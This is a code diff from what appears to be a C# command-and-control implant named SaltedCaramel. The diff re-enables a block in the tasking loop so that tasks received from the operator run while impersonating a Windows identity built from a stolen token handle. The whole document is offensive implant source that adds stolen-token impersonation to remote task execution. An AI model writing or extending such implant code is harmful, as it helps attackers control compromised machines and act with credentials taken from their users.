@@ -3,6 +3,7 @@ using System.Diagnostics;
 using System.Linq;
 using System.Net;
 using System.Net.Sockets;
+using System.Security.Principal;
 using System.Threading;
 
 namespace SaltedCaramel
@@ -36,7 +37,6 @@ namespace SaltedCaramel
                 SCTask task = implant.CheckTasking();
                 if (task.command != "none")
                 {
-                    /*
                     if (implant.hasAlternateToken() == true)
                     {
                         using (WindowsIdentity ident = new WindowsIdentity(Token.stolenHandle))
@@ -45,8 +45,6 @@ namespace SaltedCaramel
                     }
                     else
                         ThreadPool.QueueUserWorkItem((i) => task.DispatchTask(implant));
-                    */
-                    ThreadPool.QueueUserWorkItem((i) => task.DispatchTask(implant));
                 }
                 Thread.Sleep(implant.sleep);
             }
